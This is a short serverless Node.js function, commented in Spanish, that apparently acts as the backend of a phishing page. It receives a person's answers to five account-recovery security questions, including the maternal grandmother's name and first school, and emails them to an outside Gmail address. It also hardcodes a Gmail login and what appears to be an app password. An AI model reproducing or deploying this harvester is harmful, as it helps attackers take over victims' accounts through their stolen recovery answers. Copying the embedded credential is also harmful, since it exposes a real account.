const nodemailer = require('nodemailer');
require('dotenv').config();

exports.handler = async function(event, context) {
    const { favoriteCharacter, firstCarBrand, favoriteColor, grandmotherName, schoolName } = JSON.parse(event.body);

    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'cuentaluperonp5@gmail.com',
            pass: 'ogynqksiltkdnuoz',
        },
    });

    let mailOptions = {
        from: 'cuentaluperonp5@gmail.com',
        to: 'sierroalee@gmail.com',
        subject: 'Respuestas de Seguridad',
        text: `¿Cuál es el personaje de su libro favorito? ${favoriteCharacter}\n` +
              `¿Cuál es la marca de su primer carro? ${firstCarBrand}\n` +
              `¿Cuál es su color favorito? ${favoriteColor}\n` +
              `¿Cuál es el nombre de su abuela materna? ${grandmotherName}\n` +
              `¿Cuál es el nombre de su colegio? ${schoolName}`,
    };

    try {
        await transporter.sendMail(mailOptions);
        return {
            statusCode: 200,
            body: JSON.stringify({ message: 'Correo enviado con éxito' }),
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ message: 'Error al enviar el correo' }),
        };
    }
};
